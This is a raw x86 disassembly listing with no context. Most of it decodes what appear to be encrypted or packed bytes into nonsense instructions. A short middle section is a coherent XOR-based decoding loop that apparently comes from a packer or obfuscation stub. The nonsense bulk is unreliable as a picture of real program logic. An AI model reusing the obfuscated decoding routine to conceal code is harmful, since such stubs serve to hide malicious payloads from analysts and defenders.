  403a88:	xchg   DWORD PTR [ecx+ebx*8],esp
  403a8b:	jp     0x403a8a
  403a8d:	sar    BYTE PTR [edx],0x5f
  403a90:	mov    ds:0x6b50df29,al
  403a95:	in     eax,dx
  403a96:	idiv   esp
  403a98:	jecxz  0x403a28
  403a9a:	arpl   WORD PTR [ebx+0x5a],di
  403a9d:	cli    
  403a9e:	xchg   ebp,eax
  403a9f:	push   0x35095148
  403aa4:	mov    ch,0xa3
  403aa6:	lds    edx,FWORD PTR [ecx]
  403aa8:	(bad)
  403aad:	mov    ecx,0xadc9e58
  403ab2:	stos   BYTE PTR es:[edi],al
  403ab3:	cmp    edx,ecx
  403ab5:	out    dx,al
  403ab6:	cmp    bh,BYTE PTR [eax-0x35]
  403ab9:	sbb    eax,0x18ca15e1
  403abe:	mov    eax,ds:0xe5bd5bfe
  403ac3:	push   ss
  403ac4:	dec    BYTE PTR [esi]
  403ac6:	sahf   
  403ac7:	(bad)  
  403ac8:	push   esp
  403ac9:	stos   DWORD PTR es:[edi],eax
  403aca:	xchg   edi,eax
  403acb:	sbb    BYTE PTR [esi+0x25],0x12
  403acf:	ret    0xb2a6
  403ad2:	cld    
  403ad3:	adc    al,0xa0
  403ad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ad6:	cdq    
  403ad7:	sti    
  403ad8:	or     edx,DWORD PTR [ebx-0x79]
  403adb:	dec    ebx
  403adc:	lock mov ebx,0xc8ddc0d5
  403ae2:	repz ss mov ah,0x9b
  403ae6:	xchg   BYTE PTR [edi],dl
  403ae8:	mov    ch,0xf6
  403aea:	dec    esp
  403aeb:	daa    
  403aec:	imul   ecx,DWORD PTR [esi],0xffffff9c
  403aef:	mov    esi,0x827444e9
  403af4:	add    BYTE PTR [edx-0x6a],dl
  403af7:	fiadd  DWORD PTR [ebp-0x34]
  403afa:	(bad)  
  403afb:	adc    DWORD PTR [esp+ecx*4+0x59],ebx
  403aff:	leave  
  403b00:	or     bh,dl
  403b02:	xchg   ecx,eax
  403b03:	vprotw ymm4,xmm6,[ebp-0xc]
  403b09:	xor    al,0x39
  403b0b:	call   0x1fd0d75e
  403b10:	mov    fs,WORD PTR [esp+edi*1]
  403b13:	dec    ebp
  403b14:	aam    0x8e
  403b16:	imul   edi,esi,0x5e
  403b19:	je     0x403ab4
  403b1b:	(bad)  
  403b1c:	sti    
  403b1d:	push   ecx
  403b1e:	add    eax,0x58b045bf
  403b23:	or     ah,BYTE PTR [ecx-0x30]
  403b26:	aaa    
  403b27:	cmp    eax,0x3e0f0cf2
  403b2c:	pop    ss
  403b2d:	into   
  403b2e:	fistp  DWORD PTR [eax+0x2a3fde81]
  403b34:	push   eax
  403b35:	cdq    
  403b36:	and    BYTE PTR ds:0x1bd140fe,bl
  403b3c:	jo     0x403b21
  403b3e:	shl    BYTE PTR [edi],0x51
  403b41:	mov    BYTE PTR [ecx-0x59],dh
  403b44:	ret    0xcd66
  403b47:	out    dx,eax
  403b48:	sub    esp,esi
  403b4a:	xor    ebp,esi
  403b4c:	jns    0x403ad3
  403b4e:	sbb    al,0xca
  403b50:	ret    
  403b51:	daa    
  403b52:	inc    edi
  403b53:	push   esi
  403b54:	popf   
  403b55:	add    ah,BYTE PTR [ebp-0x5450f22a]
  403b5b:	sbb    eax,0x11fe361b
  403b60:	shr    DWORD PTR [eax+eiz*1+0x71],1
  403b64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b65:	cdq    
  403b66:	cmp    esp,DWORD PTR [edx]
  403b68:	retf   0x2e92
  403b6b:	stos   BYTE PTR es:[edi],al
  403b6c:	je     0x403bc1
  403b6e:	aad    0xc2
  403b70:	and    edx,DWORD PTR [ebp+0x2ded3665]
  403b76:	mov    al,0x12
  403b78:	dec    esi
  403b79:	mov    dh,0x96
  403b7b:	cdq    
  403b7c:	sbb    eax,0xe734b481
  403b81:	pop    ebx
  403b82:	fs nop
  403b84:	int3   
  403b85:	in     eax,0xf6
  403b87:	xchg   edi,ecx
  403b89:	dec    eax
  403b8a:	clc    
  403b8b:	mov    edi,0xfd91548e
  403b90:	mov    ebp,0xcb799c8c
  403b95:	sahf   
  403b96:	jmp    0x403be7
  403b98:	push   0xf05fcb5
  403b9d:	ins    BYTE PTR es:[edi],dx
  403b9e:	xchg   esi,eax
  403b9f:	in     al,dx
  403ba0:	out    0xbf,eax
  403ba2:	aaa    
  403ba3:	jp     0x403b4e
  403ba5:	retf   
  403ba6:	idiv   BYTE PTR [ebx+eiz*1+0x28d2925b]
  403bad:	lds    eax,FWORD PTR [ecx+0x73b16a1d]
  403bb3:	or     eax,0x736c797e
  403bb8:	xchg   esp,eax
  403bb9:	xchg   ebx,eax
  403bba:	icebp  
  403bbb:	clc    
  403bbc:	iret   
  403bbd:	xor    eax,0x360873ea
  403bc2:	add    ebp,ecx
  403bc4:	fdiv   DWORD PTR [esi-0x7f6d15bb]
  403bca:	mov    ds:0xfb6288df,eax
  403bcf:	mov    esi,cs
  403bd1:	or     BYTE PTR [esi],dl
  403bd3:	mov    WORD PTR [ebx+0x22b56b4f],?
  403bd9:	cmp    BYTE PTR [esi],cl
  403bdb:	mov    BYTE PTR [eax-0x6bb7a375],bh
  403be1:	aas    
  403be2:	popa   
  403be3:	fdiv   st(5),st
  403be5:	(bad)  
  403be6:	pop    ebx
  403be7:	push   0x41
  403be9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bea:	mov    eax,0xc1898f76
  403bef:	add    BYTE PTR [ebp+0x59],al
  403bf2:	mov    cl,0x3b
  403bf4:	xchg   ebp,eax
  403bf5:	xchg   ebx,eax
  403bf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bf7:	and    dh,dl
  403bf9:	mov    ?,WORD PTR [ecx]
  403bfb:	rol    DWORD PTR [ebp-0x24475737],cl
  403c01:	sbb    eax,0xf6e903db
  403c06:	add    bl,BYTE PTR [eax-0x30dd1793]
  403c0c:	popf   
  403c0d:	cwde   
  403c0e:	push   eax
  403c0f:	push   es
  403c10:	call   0x81e1a741
  403c15:	(bad)  
  403c16:	xor    dh,ah
  403c18:	lea    edx,[edx-0x43ba38bf]
  403c1e:	mov    esp,0x8bf89c85
  403c23:	inc    ebp
  403c24:	enter  0x558b,0xec
  403c28:	xor    eax,esi
  403c2a:	add    eax,edi
  403c2c:	cmp    edx,eax
  403c2e:	je     0x40617c
  403c34:	mov    eax,DWORD PTR [ebp-0x20]
  403c37:	xor    eax,esi
  403c39:	mov    edx,0xffcd8d0b
  403c3e:	sub    edx,eax
  403c40:	add    edx,DWORD PTR [ebp-0x14]
  403c43:	mov    eax,DWORD PTR [ebp-0x20]
  403c46:	mov    ebx,DWORD PTR [ebp-0x10]
  403c49:	xor    eax,esi
  403c4b:	add    eax,edi
  403c4d:	imul   eax,ebx
  403c50:	cmp    eax,edx
  403c52:	ja     0x406179
  403c58:	mov    edx,DWORD PTR [ebp-0x10]
  403c5b:	mov    eax,DWORD PTR [ebp-0x14]
  403c5e:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c61:	sub    eax,edx
  403c63:	xor    ebx,esi
  403c65:	xor    edx,edx
  403c67:	add    ebx,edi
  403c69:	div    ebx
  403c6b:	mov    DWORD PTR [ebp-0x8],eax
  403c6e:	mov    eax,DWORD PTR [ebp-0x44]
  403c71:	mov    edx,DWORD PTR [ebp-0x8]
  403c74:	xor    eax,esi
  403c76:	add    eax,edi
  403c78:	cmp    edx,eax
  403c7a:	jbe    0x403c8a
  403c80:	mov    eax,DWORD PTR [ebp-0x44]
  403c83:	xor    eax,esi
  403c85:	add    eax,edi
  403c87:	mov    DWORD PTR [ebp-0x8],eax
  403c8a:	mov    eax,DWORD PTR [ebp-0x2c]
  403c8d:	mov    edx,DWORD PTR [ebp-0x8]
  403c90:	xor    eax,esi
  403c92:	add    eax,edi
  403c94:	imul   eax,edx
  403c97:	mov    DWORD PTR [ebp-0x8],eax
  403c9a:	mov    eax,DWORD PTR [ebp-0x38]
  403c9d:	mov    edx,DWORD PTR [ebp-0x8]
  403ca0:	xor    eax,esi
  403ca2:	add    eax,edi
  403ca4:	cmp    edx,eax
  403ca6:	je     0x406162
  403cac:	mov    eax,DWORD PTR [ebp-0x8]
  403caf:	mov    DWORD PTR [ebp-0x18],eax
  403cb2:	mov    eax,DWORD PTR [ebp-0x10]
  403cb5:	add    eax,DWORD PTR [ebp-0x54]
  403cb8:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  403cbf:	mov    DWORD PTR [ebp-0x8],eax
  403cc2:	mov    eax,0xf89c85a2
  403cc7:	mov    DWORD PTR [ebp-0x28],eax
  403cca:	mov    DWORD PTR [ebp-0x5c],0xf89c85a3
  403cd1:	mov    DWORD PTR [ebp-0x40],0xf89c85a0
  403cd8:	mov    DWORD PTR [ebp-0x30],eax
  403cdb:	mov    eax,DWORD PTR [ebp-0x1c]
  403cde:	xor    eax,esi
  403ce0:	add    eax,edi
  403ce2:	jmp    0x40611e
  403ce7:	mov    DWORD PTR [ebp-0x4c],0xf89c85b8
  403cee:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  403cf5:	mov    eax,DWORD PTR [ebp-0x30]
  403cf8:	mov    edx,DWORD PTR [ebp-0xc]
  403cfb:	xor    eax,esi
  403cfd:	add    eax,edi
  403cff:	imul   eax,edx
  403d02:	mov    edx,DWORD PTR [ebp-0x8]
  403d05:	mov    al,BYTE PTR [eax+edx*1]
  403d08:	mov    BYTE PTR [ebp-0x1],al
  403d0b:	mov    eax,DWORD PTR [ebp-0x30]
  403d0e:	mov    edx,DWORD PTR [ebp-0xc]
  403d11:	xor    eax,esi
  403d13:	add    eax,edi
  403d15:	imul   eax,edx
  403d18:	mov    edx,DWORD PTR [ebp-0x5c]
  403d1b:	xor    edx,esi
  403d1d:	add    eax,edx
  403d1f:	mov    edx,DWORD PTR [ebp-0x8]
  403d22:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f5]
  403d2a:	mov    edx,DWORD PTR [ebp-0x4c]
  403d2d:	xor    edx,esi
  403d2f:	lea    eax,[edx+eax*1+0x3272f5]
  403d36:	movzx  edx,BYTE PTR [ebp-0x1]
  403d3a:	xor    edx,eax
  403d3c:	mov    BYTE PTR [ebp-0x1],dl
  403d3f:	mov    al,BYTE PTR [ebp-0x1]
  403d42:	mov    edx,DWORD PTR [ebp-0x30]
  403d45:	mov    ebx,DWORD PTR [ebp-0xc]
  403d48:	xor    edx,esi
  403d4a:	add    edx,edi
  403d4c:	imul   edx,ebx
  403d4f:	mov    ebx,DWORD PTR [ebp-0x8]
  403d52:	mov    BYTE PTR [edx+ebx*1],al
  403d55:	mov    eax,DWORD PTR [ebp-0x30]
  403d58:	mov    edx,DWORD PTR [ebp-0xc]
  403d5b:	xor    eax,esi
  403d5d:	add    eax,edi
  403d5f:	imul   eax,edx
  403d62:	mov    edx,DWORD PTR [ebp-0x8]
  403d65:	mov    al,BYTE PTR [eax+edx*1]
  403d68:	mov    BYTE PTR [ebp-0x1],al
  403d6b:	mov    eax,DWORD PTR [ebp-0x30]
  403d6e:	mov    edx,DWORD PTR [ebp-0xc]
  403d71:	xor    eax,esi
  403d73:	add    eax,edi
  403d75:	imul   eax,edx
  403d78:	mov    edx,DWORD PTR [ebp-0x28]
  403d7b:	xor    edx,esi
  403d7d:	add    eax,edx
  403d7f:	mov    edx,DWORD PTR [ebp-0x8]
  403d82:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f5]
  403d8a:	mov    edx,DWORD PTR [ebp-0x50]
  403d8d:	xor    edx,esi
  403d8f:	lea    eax,[edx+eax*1+0x3272f5]
  403d96:	movzx  edx,BYTE PTR [ebp-0x1]
  403d9a:	xor    edx,eax
  403d9c:	mov    BYTE PTR [ebp-0x1],dl
  403d9f:	mov    al,BYTE PTR [ebp-0x1]
  403da2:	mov    edx,DWORD PTR [ebp-0x30]
  403da5:	mov    ebx,DWORD PTR [ebp-0xc]
  403da8:	xor    edx,esi
  403daa:	add    edx,edi
  403dac:	imul   edx,ebx
  403daf:	mov    ebx,DWORD PTR [ebp-0x8]
  403db2:	jmp    0x406107
  403db7:	dec    ebx
  403db8:	inc    eax
  403db9:	sub    eax,0xc4820296
  403dbe:	scas   al,BYTE PTR es:[edi]
  403dbf:	push   0x76dd8915
  403dc4:	call   0x8383:0x5e4b2393
  403dcb:	dec    ebx
  403dcc:	pop    esi
  403dcd:	add    DWORD PTR [ebx+0x23a2c986],0x3b
  403dd4:	dec    edi
  403dd5:	mov    bl,0xac
  403dd7:	push   es
  403dd8:	mov    ah,0xe4
  403dda:	retf   0x4f77
  403ddd:	push   es
  403dde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ddf:	loope  0x403d79
  403de1:	mov    dh,0x8d
  403de3:	mov    al,0xca
  403de5:	mov    ecx,0xde0a30dd
  403dea:	ret    
  403deb:	mov    cl,0x1a
  403ded:	out    0xc9,eax
  403def:	xchg   ecx,eax
  403df0:	push   esi
  403df1:	(bad)  
  403df3:	or     DWORD PTR [ebp+0x7d6c1f7a],ebx
  403df9:	or     DWORD PTR ds:0x628f7aa,eax
  403dff:	(bad)  
  403e00:	popa   
  403e01:	xchg   esi,eax
  403e02:	dec    edx
  403e03:	rol    DWORD PTR [ebx-0x62627ff7],cl
  403e09:	mov    ebp,0xdac3481
  403e0e:	nop
  403e0f:	sub    eax,0xaec2e396
  403e14:	ss repnz xor eax,0xee58f657
  403e1b:	ror    ebx,cl
  403e1d:	add    al,0x8
  403e1f:	in     al,dx
  403e20:	enter  0xbc2a,0x96
  403e24:	ret    0x763e
  403e27:	repz and al,0x62
  403e2a:	cs stos DWORD PTR es:[edi],eax
  403e2c:	js     0x403e0b
  403e2e:	fcom   DWORD PTR [ebx+eiz*1-0x50]
  403e32:	(bad)
  403e35:	sub    al,0xd5
  403e37:	adc    eax,0x599751fe
  403e3c:	adc    DWORD PTR [edi],ecx
  403e3e:	scas   eax,DWORD PTR es:[edi]
  403e3f:	sahf   
  403e40:	je     0x403e4c
  403e42:	leave  
  403e43:	lock sar BYTE PTR [ebx-0xa],0x1f
  403e48:	in     al,dx
  403e49:	cmp    DWORD PTR [eax],esp
  403e4b:	sbb    DWORD PTR [edi-0x624831dc],0x66061c8
  403e55:	bound  eax,QWORD PTR [eax+ebp*1]
  403e58:	jns    0x403e43
  403e5a:	inc    ebx
  403e5b:	stos   BYTE PTR es:[edi],al
  403e5c:	pop    eax
  403e5d:	ret    
  403e5e:	(bad)  
  403e5f:	in     eax,dx
  403e60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e61:	push   edi
  403e62:	add    BYTE PTR [edx],ah
  403e64:	xor    edx,ebx
  403e66:	sahf   
  403e67:	jl     0x403e7f
  403e69:	xor    ebx,DWORD PTR [ecx-0x3f899502]
  403e6f:	mov    fs,WORD PTR [ebx+0x11]
  403e72:	mov    ah,0xf2
  403e74:	xor    eax,0xeccc94b7
  403e79:	frstor [ecx+0x4f321a79]
  403e7f:	and    eax,0x4cea3eb6
  403e84:	xchg   ebx,eax
  403e85:	mov    edi,?
  403e87:	sar    al,1
  403e89:	popf   
  403e8a:	inc    eax
  403e8b:	dec    ebp
  403e8c:	jl     0x403e22
  403e8e:	pop    ebx
  403e8f:	add    edx,DWORD PTR [ecx+0x9240861]
  403e95:	test   al,0x48
  403e97:	mov    dh,BYTE PTR [edi]
  403e99:	out    dx,eax
  403e9a:	mov    ah,0xe9
  403e9c:	sbb    BYTE PTR [ecx-0x3cf065bc],ch
  403ea2:	sbb    eax,0xaa12615d
  403ea7:	push   ecx
  403ea8:	mov    esp,0xf610f2f6
  403ead:	xchg   esp,eax
  403eae:	jg     0x403ec1
  403eb0:	in     eax,0x72
  403eb2:	repnz pop es
  403eb4:	ss pop edx
  403eb6:	out    0x8a,eax
  403eb8:	inc    ecx
  403eb9:	pop    eax
  403eba:	fwait
  403ebb:	iret   
  403ebc:	jno    0x403e42
  403ebe:	or     al,0x22
  403ec0:	cmp    BYTE PTR [edi+0xb],ah
  403ec3:	fisubr DWORD PTR [ebx]
  403ec5:	test   DWORD PTR [ebx],0xcc74dbbf
  403ecb:	mov    esp,0x47df5d
  403ed0:	es inc esi
  403ed2:	icebp  
  403ed3:	mov    al,ds:0xc9d10f51
  403ed8:	mov    ebx,0x4e6d6117
  403edd:	(bad)  
  403ede:	shr    BYTE PTR [ebp+0x6dc97d20],1
  403ee4:	push   esp
  403ee5:	xchg   ebp,eax
  403ee6:	rcl    DWORD PTR cs:[ebx-0x35],0x56
  403eeb:	push   ebp
  403eec:	mov    eax,ds:0x7f0bdc07
  403ef1:	imul   ecx,eax,0xb9588065
  403ef7:	and    al,0x9a
  403ef9:	cmp    DWORD PTR [ebx],ebp
  403efb:	jle    0x403e92
  403efd:	cmp    eax,0x7dec840c
  403f02:	pop    esp
  403f03:	les    esi,FWORD PTR [eax+ebx*4]
  403f06:	pop    ss
  403f07:	sub    DWORD PTR [ebp+ecx*8+0x7d30883f],esi
  403f0e:	mov    dl,0x6c
  403f10:	jl     0x403f6f
  403f12:	aad    0xa7
  403f14:	fdiv   QWORD PTR [eax]
  403f16:	mov    ecx,0x896813c0
  403f1b:	mov    dl,0xc1
  403f1d:	dec    edx
  403f1e:	pop    esi
  403f1f:	(bad)  
  403f21:	sbb    al,0x77
  403f23:	pop    ecx
  403f24:	pop    ebx
  403f25:	dec    esp
  403f26:	or     eax,0xb998c708
  403f2b:	xchg   ebx,eax
  403f2c:	cmp    dl,0x20
  403f2f:	jl     0x403fac
  403f31:	lods   al,BYTE PTR ds:[esi]
  403f32:	repz and ch,BYTE PTR [eax]
  403f35:	push   ebx
  403f36:	lods   eax,DWORD PTR ds:[esi]
  403f37:	mov    DWORD PTR [ecx-0x28],0xd8a6fcb6
  403f3e:	bound  ebp,QWORD PTR [edx]
  403f40:	pushf  
  403f41:	scas   eax,DWORD PTR es:[edi]
  403f42:	xchg   esp,eax
  403f43:	push   ebp
  403f44:	push   0x9c4a2cd9
  403f49:	dec    ebp
  403f4a:	addr16 ffreep st(3)
  403f4d:	inc    edx
  403f4e:	mov    eax,DWORD PTR [esi-0x53de20eb]
  403f54:	popa   
  403f55:	int3   
  403f56:	push   edi
  403f57:	div    BYTE PTR [ebx+eiz*4]
  403f5a:	sbb    eax,edx
  403f5c:	xchg   ebp,eax
  403f5d:	adc    ah,0x4d
  403f60:	add    BYTE PTR [eax+0x65],bl
  403f63:	mov    ebx,0xf06639c3
  403f68:	aaa    
  403f69:	xor    DWORD PTR [ebx+0x2545b239],0xc5a1149e
  403f73:	ficomp DWORD PTR [esi]
  403f75:	stc    
  403f76:	or     BYTE PTR [ebx-0x344a37e3],bh
  403f7c:	loopne 0x403f5c
  403f7e:	sbb    BYTE PTR [ebp+0x520b3370],cl
  403f84:	loopne 0x403fe8
  403f86:	cmp    BYTE PTR [ebx-0x729f65d5],0xd5
  403f8d:	mov    eax,0xbb2832b2
  403f92:	out    0x63,al
  403f94:	cmp    BYTE PTR [edx+0x6041617f],0xcd
  403f9b:	das    
  403f9c:	or     al,0xe7
  403f9e:	jne    0x403f31
  403fa0:	mov    dh,0xea
  403fa2:	xor    ecx,DWORD PTR [ebx]
  403fa4:	mov    ebx,0xa0b9076f
  403fa9:	mov    al,0xba
  403fab:	mov    al,ds:0x1822410a
  403fb0:	or     ah,bl
  403fb2:	lods   eax,DWORD PTR ds:[esi]
  403fb3:	lods   eax,DWORD PTR ds:[esi]
  403fb4:	or     al,0x84
  403fb6:	cmp    DWORD PTR [edi+edi*1-0x4bc46196],esp
  403fbd:	push   edx
  403fbe:	mov    ss,WORD PTR [ebx+eax*4+0x505d9d13]
  403fc5:	call   0x55f3c7fa
  403fca:	adc    ebx,DWORD PTR [ecx]
  403fcc:	lds    ebx,FWORD PTR [edx]
  403fce:	ss dec esi
  403fd0:	mov    ds:0xa4570c93,al
  403fd5:	adc    BYTE PTR [edx],0x2a
  403fd8:	mov    bl,0x41
  403fda:	or     al,0xb1
  403fdc:	jbe    0x403f90
  403fde:	out    0xf3,eax
  403fe0:	out    0x1a,eax
  403fe2:	mov    ds:0x52b9c615,eax
  403fe7:	xchg   esp,eax
  403fe8:	xchg   edx,eax
  403fe9:	sar    BYTE PTR [ebx+0x4762f8ff],cl
  403fef:	pop    esp
  403ff0:	data16 mov BYTE PTR [ebx],al
  403ff3:	jg     0x404017
  403ff5:	sub    BYTE PTR [edi],bl
  403ff7:	cmp    DWORD PTR [ebx-0x5d],edi
  403ffa:	ror    BYTE PTR [edi+0x40],1
  403ffd:	scas   al,BYTE PTR es:[edi]
  403ffe:	ds dec esi
  404000:	fdivr  st,st(6)
  404002:	mov    edi,0xe9a86297
  404007:	imul   ecx,DWORD PTR [ebp+0x39db1086],0xffffffea
  40400e:	mov    ds:0xc7039423,al
  404013:	xchg   ebx,eax
  404014:	out    0x5e,eax
  404016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404017:	xchg   edi,eax
  404018:	pusha  
  404019:	mov    dl,0xc6
  40401b:	repnz mov ecx,0xf4c847c4
  404021:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404022:	call   0x65cb807b
  404027:	dec    ecx
  404028:	sub    eax,0x1330a9a9
  40402d:	mov    WORD PTR [ebp+0x2b4cae77],es
  404033:	cmp    BYTE PTR [ecx],0xb9
  404036:	adc    eax,0x2bd34ddd
  40403b:	nop
  40403c:	mov    bh,0x25
  40403e:	sub    al,0x22
  404040:	and    al,0x9f
  404042:	out    0x44,eax
  404044:	xlat   BYTE PTR ds:[ebx]
  404045:	xor    dl,ch
  404047:	lods   al,BYTE PTR ds:[esi]
  404048:	pop    esp
  404049:	shl    esi,1
  40404b:	pop    esi
  40404c:	dec    esi
  40404d:	loop   0x404050
  40404f:	jp     0x404040
  404051:	repnz (bad) [eax]
  404054:	pop    esi
  404055:	and    ch,cl
  404057:	inc    edx
  404058:	push   esp
  404059:	push   0x35
  40405b:	mov    esi,0xe6517e9a
  404060:	mov    edx,0x23ef76ef
  404065:	xor    al,0x63
  404067:	sbb    DWORD PTR [ebp+0x49],0x2b055ae0
  40406e:	rcl    BYTE PTR [ebx-0x467bc911],0xf9
  404075:	sub    al,0x5f
  404077:	adc    eax,0x2debf03d
  40407c:	mov    eax,0xd76dc44c
  404081:	and    bh,dh
  404083:	jl     0x40403a
  404085:	mov    al,0x47
  404087:	sub    BYTE PTR [edi+0x2dd02337],al
  40408d:	cmp    eax,0x388755fa
  404092:	shl    DWORD PTR [eax],1
  404094:	sbb    BYTE PTR [edi+0x35],dh
  404097:	xor    BYTE PTR [ebp+0x1597ce4b],cl
  40409d:	cmp    bl,BYTE PTR [eax]
  40409f:	fucomi st,st(0)
  4040a1:	ins    BYTE PTR es:[edi],dx
  4040a2:	mov    WORD PTR [esi],cs
  4040a4:	retf   
  4040a5:	shr    BYTE PTR [esi+edx*4-0x71],cl
  4040a9:	ror    DWORD PTR [ebx+0x17c05a36],0x51
  4040b0:	shr    DWORD PTR [ebp+0x1fcd7062],1
  4040b6:	into   
  4040b7:	push   ds
  4040b8:	xchg   ecx,eax
  4040b9:	mov    BYTE PTR [ebp-0x4df9a81e],ah
  4040bf:	mov    dh,0xcc
  4040c1:	push   es
  4040c2:	adc    al,0xdc
  4040c4:	imul   esp,DWORD PTR [eax-0x42b84e6e],0x2476fd01
  4040ce:	retf   
  4040cf:	hlt    
  4040d0:	iret   
  4040d1:	lock (bad) 
  4040d3:	cmp    DWORD PTR [esi*4+0x57a0d8f0],edi
  4040da:	mov    al,ds:0x213ce293
  4040df:	jbe    0x40410a
  4040e1:	dec    esp
  4040e2:	add    DWORD PTR [ebp+0x73],0xcc8d2859
  4040e9:	xchg   ebp,ebp
  4040eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040ec:	cmp    DWORD PTR [ebx+ecx*4-0xdcd5265],esi
  4040f3:	lds    esp,FWORD PTR [ecx]
  4040f5:	jl     0x404110
  4040f7:	popf   
  4040f8:	call   0x24ff3c89
  4040fd:	(bad)  
  4040fe:	xchg   esp,eax
  4040ff:	jbe    0x4040cf
  404101:	mov    ch,0xf7
  404103:	push   edi
  404104:	jp     0x4040ec
  404106:	add    al,0xcf
  404108:	cmp    BYTE PTR [ebx+eax*8-0x4b],ch
  40410c:	xchg   esi,eax
  40410d:	test   BYTE PTR [esp+ebp*4],ah
  404110:	sar    eax,1
  404112:	fcmovnu st,st(4)
  404114:	mov    DWORD PTR [esi+ebx*8+0x23],eax
  404118:	int3   
  404119:	jmp    0x404154
  40411b:	shl    BYTE PTR [edx+0x59],cl
  40411e:	jno    0x4040c7
  404120:	sar    BYTE PTR [edi-0x57f9614],cl
  404126:	add    BYTE PTR [ecx+0x1d],ah
  404129:	cld    
  40412a:	pushf  
  40412b:	das    
  40412c:	jb     0x40412e
  40412e:	ins    DWORD PTR es:[edi],dx
  40412f:	push   ss
  404130:	ror    eax,cl
  404132:	stos   DWORD PTR es:[edi],eax
  404133:	sbb    DWORD PTR [edi-0xe],ecx
  404136:	mov    eax,0x99824b0c
  40413b:	cmp    al,0xa8
  40413d:	push   ecx
  40413e:	lock rcr ecx,cl
  404141:	sbb    al,0x31
  404143:	std    
  404144:	dec    esi
  404145:	clc    
  404146:	pop    edi
  404147:	sub    eax,edx
  404149:	data16 xchg BYTE PTR [ebx-0x3e400ab6],al
  404150:	dec    edi
  404151:	mov    edx,0x50110d0f
  404156:	mov    ds:0x557b7e07,al
  40415b:	rcr    ebx,0x51
  40415e:	bound  eax,QWORD PTR [edi+0x307066a5]
  404164:	(bad)  
  404165:	jecxz  0x404120
  404167:	repnz addr16 es aam 0xc2
  40416c:	dec    ecx
  40416d:	adc    cl,ch
  40416f:	fild   QWORD PTR [edx+0x65e344a4]
  404175:	push   ebx
  404176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404177:	mov    ecx,0xf3730678
  40417c:	mov    edi,0x5d93bcc9
  404181:	xor    eax,0x6c6b1970
  404186:	int    0xe3
  404188:	mov    esi,0xd0d9aba7
  40418d:	xchg   bh,bl
  40418f:	imul   edi,DWORD PTR [edi-0x4],0xdeb03809
  404196:	pop    ebp
  404197:	jg     0x4041dd
  404199:	addr16 push 0x5e
  40419c:	xchg   ebx,eax
  40419d:	data16 aas 
  40419f:	sub    al,0x8c
  4041a1:	mov    dl,BYTE PTR [edi-0x5b]
  4041a4:	inc    ebx
  4041a5:	sub    ebx,esi
  4041a7:	in     eax,0x3a
  4041a9:	dec    edx
  4041aa:	mov    al,ds:0xebe86110
  4041af:	jge    0x404171
  4041b1:	dec    edx
  4041b2:	mov    ebp,0x1ff9ba22
  4041b7:	xor    DWORD PTR [edx+0x123c784c],ebp
  4041bd:	lods   al,BYTE PTR ds:[esi]
  4041be:	aad    0xcf
  4041c0:	mov    ebp,0xf5c8e460
  4041c5:	mov    ch,0x4
  4041c7:	in     eax,dx
  4041c8:	or     WORD PTR [edi-0x5ee66ac9],bx
  4041cf:	in     eax,0x22
  4041d1:	(bad)  
  4041d2:	es cdq 
  4041d4:	aas    
  4041d5:	xor    DWORD PTR ds:0xb0297ffa,edi
  4041db:	push   ss
  4041dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041dd:	repnz clc 
  4041df:	add    BYTE PTR [edi+ebp*1-0x54],ch
  4041e3:	pop    ss
  4041e4:	and    DWORD PTR [eax+0x4b],0xffffffb4
  4041e8:	lods   al,BYTE PTR ds:[esi]
  4041e9:	jmp    0x404193
  4041eb:	repz shr DWORD PTR [esi-0x39],1
  4041ef:	xchg   esi,eax
  4041f0:	and    al,0x43
  4041f2:	mov    eax,0x2f163061
  4041f7:	out    0x89,al
  4041f9:	mov    edi,0xc07e63ad
  4041fe:	loope  0x4041c7
  404200:	xor    al,0xe6
  404202:	outs   dx,BYTE PTR ds:[esi]
  404203:	out    dx,al
  404204:	mov    dl,0x1
  404206:	inc    eax
  404207:	xor    ebp,DWORD PTR ss:[esi-0x43]
  40420b:	mov    ch,0x90
  40420d:	les    esp,FWORD PTR ds:0x5e149c8f
  404213:	mov    eax,ds:0x794fc1bd
  404218:	repnz adc BYTE PTR [esi+esi*4+0x4d],bl
  40421d:	addr16 push ecx
  40421f:	in     eax,dx
  404220:	xor    ch,BYTE PTR [edx+eax*2+0x15]
  404224:	call   0x973fc063
  404229:	jmp    0xe5c145cb
  40422e:	xchg   DWORD PTR [edx+edi*1-0x787c461b],ebp
  404235:	mov    cl,0x35
  404237:	pop    esp
  404238:	adc    bh,BYTE PTR [esi-0x3eccd0cb]
  40423e:	rcr    BYTE PTR [eax+ebp*2+0x60fe0069],1
  404245:	sbb    ah,dh
  404247:	push   ss
  404248:	push   edx
  404249:	aaa    
  40424a:	sbb    bh,BYTE PTR [ecx-0x77]
  40424d:	push   ebx
  40424e:	leave  
  40424f:	and    ah,BYTE PTR [esi+0x67]
  404252:	repz jnp 0x40429d
  404255:	sbb    BYTE PTR [esi],0xa5
  404258:	imul   ecx,DWORD PTR [ebp-0x7e],0x62
  40425c:	xchg   edx,eax
  40425d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40425e:	data16 or al,0x33
  404261:	push   ecx
  404262:	out    dx,eax
  404263:	jnp    0x40426a
  404265:	daa    
  404266:	in     eax,0x44
  404268:	(bad)  
  404269:	iret   
  40426a:	test   DWORD PTR [eax+eax*2],esp
  40426d:	mov    BYTE PTR [eax],0x17
  404270:	push   es
  404271:	ja     0x4042ce
  404273:	jbe    0x40426d
  404275:	mov    eax,0x8f86f1df
  40427a:	test   al,0x4d
  40427c:	lods   eax,DWORD PTR ds:[esi]
  40427d:	int3   
  40427e:	daa    
